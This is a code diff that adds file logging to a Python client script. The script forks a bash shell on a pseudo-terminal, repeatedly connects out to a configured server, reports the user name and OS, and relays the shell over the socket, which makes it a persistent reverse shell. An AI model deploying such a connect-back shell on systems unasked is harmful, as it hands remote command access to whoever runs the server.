@@ -1,5 +1,13 @@
 import pty, os, sys, select, fcntl, termios, struct, re, socket, threading, time, hashlib, shutil, subprocess
 
+LOG = '/tmp/executor-client.log'
+def log(msg):
+    try:
+        with open(LOG, 'a') as f:
+            f.write(f'{time.strftime("%H:%M:%S")} {msg}\n')
+    except Exception:
+        pass
+
 # Rename process to make it identifiable (e.g. for kill/ps)
 try:
     import ctypes
@@ -82,12 +90,15 @@ def do_tunnel(remote_port, tunnel_port, server_ip, conn_id):
 # --- Init ---
 
 CLIENT_ID = get_client_id()
+log(f'init client_id={CLIENT_ID} server={SERVER_IP}:{SERVER_PORT} tmux={shutil.which("tmux")}')
 
 _lock_fd = singleton_lock(CLIENT_ID)
 if _lock_fd is None:
+    log('singleton lock failed, exiting')
     sys.exit(0)
 
 _whoami, _os_name, _has_tmux = get_sysinfo()
+log(f'sysinfo whoami={_whoami} os={_os_name} has_tmux={_has_tmux}')
 
 def new_shell():
     """Fork a new shell child, return (pid, master_fd).
@@ -113,6 +124,7 @@ def new_shell():
         else:
             os.execve('/bin/bash', ['/bin/bash'], env)
     os.close(s)
+    log(f'new_shell forked pid={p} master_fd={m}')
     return p, m
 
 pid, master = new_shell()
@@ -131,7 +143,9 @@ def run_session(conn):
     except Exception:
         pass
     tmux_flag = ' TMUX' if _has_tmux else ''
-    conn.sendall(f'HELLO {CLIENT_ID} {_whoami} {_os_name}{tmux_flag} OLLEH'.encode())
+    hello = f'HELLO {CLIENT_ID} {_whoami} {_os_name}{tmux_flag} OLLEH'
+    log(f'sending HELLO: {hello}')
+    conn.sendall(hello.encode())
     conn_fd = conn.fileno()
 
     stop = threading.Event()
@@ -193,10 +207,13 @@ def run_session(conn):
 while True:
     try:
         conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        log(f'connecting to {SERVER_IP}:{SERVER_PORT}')
         conn.connect((SERVER_IP, SERVER_PORT))
+        log('connected, starting session')
         run_session(conn)
-    except Exception:
-        pass
+        log('session ended normally')
+    except Exception as e:
+        log(f'session error: {e}')
     finally:
         try: conn.close()
         except Exception: pass
